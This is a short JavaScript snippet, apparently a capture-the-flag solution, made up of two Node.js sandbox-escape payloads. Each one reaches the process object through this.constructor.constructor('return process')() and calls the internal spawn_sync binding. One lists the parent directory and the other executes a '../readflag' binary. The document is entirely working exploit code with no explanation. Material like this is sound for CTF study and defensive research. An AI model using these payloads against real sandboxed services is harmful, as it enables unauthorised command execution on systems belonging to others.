this.constructor
  .constructor("return process")()
  .binding("spawn_sync")
  .spawn({
    file: "ls",
    args: [".."],
    envPairs: ["HOME=/"],
    stdio: [
      { type: "pipe", readable: true },
      { type: "pipe", writable: true },
    ],
  }).output;

this.constructor
  .constructor("return process")()
  .binding("spawn_sync")
  .spawn({
    file: "../readflag",
    args: ["../readflag"],
    stdio: [
      { type: "pipe", readable: true },
      { type: "pipe", writable: true },
    ],
  }).output;
